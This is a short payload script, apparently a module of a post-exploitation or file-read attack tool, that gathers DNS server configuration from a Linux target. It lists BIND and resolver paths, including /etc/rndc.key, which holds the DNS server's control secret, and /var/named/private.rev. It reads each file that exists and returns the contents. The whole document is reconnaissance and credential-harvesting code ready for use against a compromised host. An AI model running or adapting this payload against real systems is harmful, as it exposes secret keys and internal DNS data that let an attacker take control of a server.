#REQUIRE_LINUX
#This payload shows DNS Server configuration files
result = []
files = []

files.append('/etc/named.conf')
files.append('/etc/bind/named.conf.local')
files.append('/etc/bind/named.conf')
files.append('/var/named/named.conf')
files.append('/var/named/private.rev')
files.append('/etc/bind/named.conf.options')
files.append('/etc/resolv.conf')
files.append('/etc/rndc.conf ')
files.append('/etc/rndc.key')

for file in files:
    if read(file) != '':
        result.append('-------------------------')
        result.append('FILE => '+file)
        result.append(read(file))

result = [p for p in result if p != '']
